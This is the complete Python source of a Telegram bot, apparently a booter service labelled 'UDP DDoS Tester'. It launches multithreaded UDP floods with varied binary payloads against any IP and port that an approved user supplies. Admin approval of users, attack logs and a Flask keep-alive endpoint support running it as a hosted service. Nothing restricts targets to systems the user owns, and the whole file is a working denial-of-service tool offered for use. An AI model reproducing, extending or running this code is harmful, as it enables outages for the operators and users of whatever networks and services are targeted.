import socket
import threading
import time
import random
import string
import logging
from datetime import datetime
import asyncio
import json
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import uuid
from config import BOT_TOKEN, ADMIN_USER_ID, MAX_THREADS
from flask import Flask, jsonify

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ddos_logs.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class UDPDDoSTester:
    def __init__(self):
        self.running_attacks = {}
        self.authorized_users = set()
        self.attack_logs = []
        self.admin_user_id = ADMIN_USER_ID  # Admin user ID
        self.load_authorized_users()
        # Always add admin to authorized users
        self.authorized_users.add(self.admin_user_id)
        self.save_authorized_users()
        logger.info(f"Admin user {self.admin_user_id} added to authorized users")
        
    def load_authorized_users(self):
        """Load authorized users from file"""
        try:
            if os.path.exists('authorized_users.json'):
                with open('authorized_users.json', 'r') as f:
                    self.authorized_users = set(json.load(f))
        except Exception as e:
            logger.error(f"Error loading authorized users: {e}")
    
    def save_authorized_users(self):
        """Save authorized users to file"""
        try:
            with open('authorized_users.json', 'w') as f:
                json.dump(list(self.authorized_users), f)
        except Exception as e:
            logger.error(f"Error saving authorized users: {e}")
    
    def generate_random_packet(self, size=1024):
        """Generate random UDP packet data with binary content"""
        # Generate more realistic binary data for stronger attacks
        return os.urandom(size)
    
    def generate_binary_payloads(self):
        """Generate various binary payloads for different attack patterns"""
        patterns = []
        
        # Different binary patterns for more realistic attacks
        base_patterns = [
            b'\x00' * 1024,  # Null bytes
            b'\xFF' * 1024,  # All ones
            b'\xAA' * 1024,  # Alternating pattern
            b'\x55' * 1024,  # Alternating pattern
            b'\xDE\xAD\xBE\xEF' * 256,  # Common test pattern
            b'\xCA\xFE\xBA\xBE' * 256,  # Another test pattern
            b'\xFE\xED\xFA\xCE' * 256,  # Another test pattern
            b'\xBA\xAD\xF0\x0D' * 256,  # Another test pattern
        ]
        
        # Add more complex binary patterns
        complex_patterns = [
            bytes(range(256)) * 4,  # Sequential bytes
            bytes(range(255, -1, -1)) * 4,  # Reverse sequential
            b'\x01\x02\x03\x04' * 256,  # Incremental pattern
            b'\x80\x40\x20\x10' * 256,  # Bit pattern
        ]
        
        patterns.extend(base_patterns)
        patterns.extend(complex_patterns)
        
        # Add random binary data with different sizes
        for _ in range(20):
            size = random.choice([512, 1024, 1536, 2048])
            patterns.append(os.urandom(size))
        
        # Add some realistic game protocol patterns
        game_patterns = [
            b'\x12\x34\x56\x78' + os.urandom(1020),  # Game header simulation
            b'\xAB\xCD\xEF\x01' + os.urandom(1020),  # Another game pattern
            b'\x00\x00\x00\x01' + os.urandom(1020),  # Sequence number pattern
        ]
        
        patterns.extend(game_patterns)
        
        return patterns
    
    def udp_flood_worker(self, target_ip, target_port, attack_id, duration):
        """Worker function for UDP flood attack with binary payloads"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            # Generate binary payloads for this worker
            binary_payloads = self.generate_binary_payloads()
            payload_index = 0
            
            start_time = time.time()
            packets_sent = 0
            
            while time.time() - start_time < duration and attack_id in self.running_attacks:
                try:
                    # Use different binary payloads for more realistic attack
                    packet_data = binary_payloads[payload_index % len(binary_payloads)]
                    sock.sendto(packet_data, (target_ip, target_port))
                    packets_sent += 1
                    payload_index += 1
                    
                    # Vary packet sizes for more realistic attack
                    if packets_sent % 100 == 0:
                        # Occasionally send larger packets
                        large_packet = os.urandom(random.randint(1024, 2048))
                        sock.sendto(large_packet, (target_ip, target_port))
                        packets_sent += 1
                    
                    # Delay optimized for free plan
                    time.sleep(0.01)  # Increased delay to prevent resource exhaustion
                    
                except Exception as e:
                    logger.error(f"Error sending packet: {e}")
                    break
            
            sock.close()
            logger.info(f"Worker completed: {packets_sent} binary packets sent to {target_ip}:{target_port}")
            
        except Exception as e:
            logger.error(f"Worker error: {e}")
    
    def start_attack(self, target_ip, target_port, duration, user_id):
        """Start UDP DDoS attack"""
        attack_id = str(uuid.uuid4())
        
        # Parse IP and port
        try:
            if ':' in target_ip:
                ip, port = target_ip.split(':')
                target_port = int(port)
            else:
                ip = target_ip
                target_port = int(target_port)
        except:
            return None, "Invalid IP:Port format"
        
        # Validate IP address
        try:
            socket.inet_aton(ip)
        except socket.error:
            return None, "Invalid IP address"
        
        # Validate port
        if not (1 <= target_port <= 65535):
            return None, "Invalid port number (1-65535)"
        
        # Validate duration
        if not (1 <= duration <= 300):  # Max 5 minutes
            return None, "Invalid duration (1-300 seconds)"
        
        # Start attack
        self.running_attacks[attack_id] = {
            'target_ip': ip,
            'target_port': target_port,
            'duration': duration,
            'start_time': datetime.now(),
            'user_id': user_id,
            'status': 'running'
        }
        
        # Start threads for stronger DDoS
        threads = []
        for i in range(MAX_THREADS):
            thread = threading.Thread(
                target=self.udp_flood_worker,
                args=(ip, target_port, attack_id, duration)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Log attack
        attack_log = {
            'attack_id': attack_id,
            'target_ip': ip,
            'target_port': target_port,
            'duration': duration,
            'start_time': datetime.now().isoformat(),
            'user_id': user_id,
            'threads': MAX_THREADS
        }
        self.attack_logs.append(attack_log)
        
        logger.info(f"Binary attack started: {attack_id} -> {ip}:{target_port} for {duration}s with {MAX_THREADS} threads by user {user_id}")
        
        # Schedule attack cleanup
        def cleanup_attack():
            time.sleep(duration)
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id]['status'] = 'completed'
                logger.info(f"Attack completed: {attack_id}")
        
        cleanup_thread = threading.Thread(target=cleanup_attack)
        cleanup_thread.daemon = True
        cleanup_thread.start()
        
        return attack_id, f"🔥 Binary attack started: {ip}:{target_port} for {duration}s with {MAX_THREADS} threads"
    
    def stop_attack(self, attack_id):
        """Stop running attack"""
        if attack_id in self.running_attacks:
            self.running_attacks[attack_id]['status'] = 'stopped'
            del self.running_attacks[attack_id]
            logger.info(f"Attack stopped: {attack_id}")
            return True
        return False
    
    def stop_all_attacks(self, user_id):
        """Stop all attacks by a specific user"""
        stopped_count = 0
        attacks_to_stop = []
        
        for attack_id, attack in self.running_attacks.items():
            if attack['user_id'] == user_id:
                attacks_to_stop.append(attack_id)
        
        for attack_id in attacks_to_stop:
            if self.stop_attack(attack_id):
                stopped_count += 1
        
        return stopped_count
    
    def get_running_attacks(self):
        """Get list of running attacks"""
        return self.running_attacks
    
    def get_attack_logs(self, limit=50):
        """Get recent attack logs"""
        return self.attack_logs[-limit:]

# Global instance
ddos_tester = UDPDDoSTester()

# Flask app for health check (free plan requirement)
app = Flask(__name__)

@app.route('/')
def health_check():
    """Health check endpoint for free plan"""
    return jsonify({
        "status": "online",
        "bot": "UDP DDoS Tester",
        "threads": MAX_THREADS,
        "admin": ADMIN_USER_ID,
        "running_attacks": len(ddos_tester.get_running_attacks())
    })

@app.route('/ping')
def ping():
    """Ping endpoint to keep service alive"""
    return "pong"

# Telegram Bot Commands
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    if user_id not in ddos_tester.authorized_users:
        await update.message.reply_text("❌ You are not authorized to use this bot. Contact admin to get access.")
        return
    
    # Check if user is admin
    is_admin = user_id == ddos_tester.admin_user_id
    
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="attack")],
        [InlineKeyboardButton("🛑 Stop Attacks", callback_data="stop")],
        [InlineKeyboardButton("📊 Running Attacks", callback_data="running")],
        [InlineKeyboardButton("📋 Logs", callback_data="logs")]
    ]
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("👑 Approve User", callback_data="approve_user")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    admin_text = ""
    if is_admin:
        admin_text = "\n👑 **Admin Commands:**\n• /approve user_id - Approve new users\n• /admin - Show admin panel"
    
    await update.message.reply_text(
        "🎯 **UDP DDoS Tester Bot**\n\n"
        "Commands:\n"
        f"• /attack ip:port:duration - Start binary attack ({MAX_THREADS} threads)\n"
        "• /stop - Stop all your attacks\n"
        "• /running - Show running attacks\n"
        "• /logs - Show recent logs" + admin_text + "\n\n"
        "Use the menu below or type commands directly:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command"""
    user_id = update.effective_user.id
    if user_id not in ddos_tester.authorized_users:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /attack ip:port:duration\n"
            "Example: /attack 192.168.1.1:8080:60"
        )
        return
    
    try:
        args = context.args[0].split(':')
        if len(args) != 3:
            raise ValueError("Invalid format")
        
        target_ip = args[0]
        target_port = int(args[1])
        duration = int(args[2])
        
        attack_id, message = ddos_tester.start_attack(target_ip, target_port, duration, user_id)
        
        if attack_id:
            await update.message.reply_text(f"✅ {message}\n🆔 Attack ID: `{attack_id}`\n\n💡 Use /stop to stop all your attacks", parse_mode='Markdown')
        else:
            await update.message.reply_text(f"❌ {message}")
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /running command"""
    user_id = update.effective_user.id
    if user_id not in ddos_tester.authorized_users:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    running = ddos_tester.get_running_attacks()
    
    if not running:
        await update.message.reply_text("📊 No attacks currently running.")
        return
    
    message = "📊 **Running Attacks:**\n\n"
    for attack_id, attack in running.items():
        elapsed = datetime.now() - attack['start_time']
        remaining = attack['duration'] - elapsed.total_seconds()
        message += f"🆔 `{attack_id}`\n"
        message += f"🎯 Target: `{attack['target_ip']}:{attack['target_port']}`\n"
        message += f"⏱️ Remaining: `{max(0, int(remaining))}s`\n"
        message += f"👤 User: `{attack['user_id']}`\n\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /logs command"""
    user_id = update.effective_user.id
    if user_id not in ddos_tester.authorized_users:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    logs = ddos_tester.get_attack_logs(10)
    
    if not logs:
        await update.message.reply_text("📋 No logs available.")
        return
    
    message = "📋 **Recent Attack Logs:**\n\n"
    for log in reversed(logs):
        message += f"🆔 `{log['attack_id']}`\n"
        message += f"🎯 `{log['target_ip']}:{log['target_port']}`\n"
        message += f"⏱️ Duration: `{log['duration']}s`\n"
        message += f"👤 User: `{log['user_id']}`\n"
        message += f"🕐 Time: `{log['start_time']}`\n\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /add command (deprecated - use /approve instead)"""
    user_id = update.effective_user.id
    if user_id not in ddos_tester.authorized_users:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    await update.message.reply_text("⚠️ This command is deprecated. Use /approve instead.")

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /approve command (admin only)"""
    user_id = update.effective_user.id
    
    # Check if user is admin
    if user_id != ddos_tester.admin_user_id:
        await update.message.reply_text("❌ Only admin can approve users.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /approve user_id")
        return
    
    try:
        new_user_id = int(context.args[0])
        ddos_tester.authorized_users.add(new_user_id)
        ddos_tester.save_authorized_users()
        logger.info(f"Admin {user_id} approved user {new_user_id}")
        await update.message.reply_text(f"✅ User {new_user_id} approved successfully!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command (admin only)"""
    user_id = update.effective_user.id
    
    # Check if user is admin
    if user_id != ddos_tester.admin_user_id:
        await update.message.reply_text("❌ Only admin can access this command.")
        return
    
    # Show admin info and authorized users
    authorized_count = len(ddos_tester.authorized_users)
    running_count = len(ddos_tester.get_running_attacks())
    
    message = f"👑 **Admin Panel**\n\n"
    message += f"🆔 Admin ID: `{ddos_tester.admin_user_id}`\n"
    message += f"👥 Authorized Users: `{authorized_count}`\n"
    message += f"🚀 Running Attacks: `{running_count}`\n\n"
    message += f"**Authorized Users:**\n"
    
    for user in sorted(ddos_tester.authorized_users):
        if user == ddos_tester.admin_user_id:
            message += f"👑 `{user}` (Admin)\n"
        else:
            message += f"👤 `{user}`\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /debug command for troubleshooting"""
    user_id = update.effective_user.id
    
    # Show debug info
    message = f"🔍 **Debug Information**\n\n"
    message += f"🆔 Your User ID: `{user_id}`\n"
    message += f"👑 Admin ID: `{ddos_tester.admin_user_id}`\n"
    message += f"✅ Is Admin: `{user_id == ddos_tester.admin_user_id}`\n"
    message += f"✅ Is Authorized: `{user_id in ddos_tester.authorized_users}`\n"
    message += f"👥 Total Authorized: `{len(ddos_tester.authorized_users)}`\n\n"
    message += f"**Authorized Users:**\n"
    
    for user in sorted(ddos_tester.authorized_users):
        if user == ddos_tester.admin_user_id:
            message += f"👑 `{user}` (Admin)\n"
        else:
            message += f"👤 `{user}`\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def force_add_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /forceaddadmin command to manually add admin"""
    user_id = update.effective_user.id
    
    # Force add admin to authorized users
    ddos_tester.authorized_users.add(ddos_tester.admin_user_id)
    ddos_tester.save_authorized_users()
    
    message = f"✅ **Admin Force Added**\n\n"
    message += f"🆔 Admin ID: `{ddos_tester.admin_user_id}`\n"
    message += f"👥 Total Authorized: `{len(ddos_tester.authorized_users)}`\n"
    message += f"✅ Admin is now authorized!"
    
    await update.message.reply_text(message, parse_mode='Markdown')
    logger.info(f"Admin {ddos_tester.admin_user_id} force added by user {user_id}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    user_id = update.effective_user.id
    if user_id not in ddos_tester.authorized_users:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    # Stop all attacks by this user
    stopped_count = ddos_tester.stop_all_attacks(user_id)
    
    if stopped_count > 0:
        await update.message.reply_text(f"🛑 Stopped {stopped_count} attack(s) successfully!")
        logger.info(f"User {user_id} stopped {stopped_count} attacks")
    else:
        await update.message.reply_text("ℹ️ No running attacks found to stop.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "attack":
        await query.edit_message_text(
            "🚀 **Start Attack**\n\n"
            "Send: /attack ip:port:duration\n"
            "Example: /attack 192.168.1.1:8080:60",
            parse_mode='Markdown'
        )
    elif query.data == "running":
        await running_command(update, context)
    elif query.data == "logs":
        await logs_command(update, context)
    elif query.data == "stop":
        await stop_command(update, context)
    elif query.data == "approve_user":
        await query.edit_message_text(
            "👑 **Approve User**\n\n"
            "Send: /approve user_id\n"
            "Example: /approve 123456789\n\n"
            "Only admin can approve users.",
            parse_mode='Markdown'
        )


def run_flask():
    """Run Flask app for health check"""
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

def main():
    """Main function to run the bot"""
    # Use bot token from config or environment variable
    bot_token = os.getenv('BOT_TOKEN', BOT_TOKEN)
    if not bot_token or bot_token == 'your_bot_token_here':
        logger.error("BOT_TOKEN not configured! Please set it in config.py or environment variable.")
        return
    
    # Start Flask in background for health check
    import threading
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Create application
    application = Application.builder().token(bot_token).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("running", running_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("add", add_user_command))
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("debug", debug_command))
    application.add_handler(CommandHandler("forceaddadmin", force_add_admin_command))
    
    # Add button callback handler
    application.add_handler(MessageHandler(filters.Regex("^/"), start))
    
    # Add callback query handler
    from telegram.ext import CallbackQueryHandler
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Start the bot
    logger.info("Starting UDP DDoS Tester Bot...")
    application.run_polling()

if __name__ == "__main__":
    main()
